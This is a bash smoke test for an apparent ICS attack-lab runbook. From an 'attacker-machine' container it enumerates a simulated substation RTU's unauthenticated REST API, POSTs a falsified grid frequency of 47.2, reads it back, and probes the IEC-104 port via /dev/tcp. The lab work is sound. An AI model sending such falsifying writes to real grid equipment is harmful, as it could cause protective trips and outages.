#!/usr/bin/env bash
# Smoke test: books/iec104-false-readings.md
#
# substation-rtu (10.10.5.14) exposes:
#   :8080  REST management API, no auth, runbook drives this
#   :2404  IEC-60870-5-104 protocol endpoint (raw IEC-104, native master path)
# Both reachable from the internet zone (attacker-machine).
#
# Coverage:
#   Stage 1  REST API enumeration (no auth, /datapoints lists 6 datapoints)
#   Stage 2  POST /datapoints/<id> changes a value, GET reflects it
#   Stage 5  IEC-104 :2404 reachable for native master clients
#
# Stages 3 and 4 use the same POST mechanism on different datapoints; covered
# by Stage 2's write-then-read assertion.
#
# Usage: bash tests/smoke/test_runbook_iec104_false_readings.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
RTU="iec104_rtu"

for c in "$ATTACKER" "$RTU"; do
    require_running "$c"
done

echo "[iec104] Waiting for substation-rtu..."
wait_for_port "$ATTACKER" 10.10.5.14 8080 30 || fail "substation-rtu :8080 not ready"
wait_for_port "$ATTACKER" 10.10.5.14 2404 30 || fail "substation-rtu :2404 (IEC-104) not ready"

echo "[iec104] Stage 1: REST API enumeration"

# The runbook hits GET /datapoints. The simulator's exact API shape is
# determined by ghcr.io/richyp7/iec60870-5-104-simulator. We assert on the
# datapoint names rather than IDs to stay robust against schema details.
DP_LIST="$(in_container "$ATTACKER" curl -sf -m 5 http://10.10.5.14:8080/datapoints 2>&1)"
assert_contains "$DP_LIST" "feeder_a_voltage" "datapoint feeder_a_voltage exposed"
assert_contains "$DP_LIST" "feeder_b_voltage" "datapoint feeder_b_voltage exposed"
assert_contains "$DP_LIST" "load_current"     "datapoint load_current exposed"
assert_contains "$DP_LIST" "frequency"        "datapoint frequency exposed"
assert_contains "$DP_LIST" "breaker_a_state"  "datapoint breaker_a_state exposed"
assert_contains "$DP_LIST" "breaker_b_state"  "datapoint breaker_b_state exposed"

echo "[iec104] Stage 2: POST falsifies a datapoint, GET reflects new value"

# Pick frequency (numeric, easy to verify). Set to 47.2 (under-frequency trip
# territory per the runbook), then read back.
WRITE_OUT="$(in_container "$ATTACKER" curl -sf -m 5 \
    -X POST http://10.10.5.14:8080/datapoints/4 \
    -H 'Content-Type: application/json' \
    -d '{"value": 47.2}' 2>&1)"
assert_contains "$WRITE_OUT" "ok|status|47\\.2" "POST /datapoints/4 accepted"

VERIFY_OUT="$(in_container "$ATTACKER" curl -sf -m 5 http://10.10.5.14:8080/datapoints 2>&1)"
assert_contains "$VERIFY_OUT" "47\\.2" "GET /datapoints reflects falsified frequency value"

# Reset to nominal so a subsequent test run sees a clean value
in_container "$ATTACKER" curl -sf -m 5 \
    -X POST http://10.10.5.14:8080/datapoints/4 \
    -H 'Content-Type: application/json' \
    -d '{"value": 49.98}' >/dev/null 2>&1 || true

echo "[iec104] Stage 5: IEC-104 protocol port reachable"

# The native master path is what an attacker would use after recon; minimum
# assertion is that :2404 accepts a TCP connection.
PROBE="$(in_container "$ATTACKER" bash -c 'exec 3<>/dev/tcp/10.10.5.14/2404 && echo PORT_OPEN' 2>&1)"
assert_contains "$PROBE" "PORT_OPEN" "IEC-104 :2404 accepts TCP connections"

summary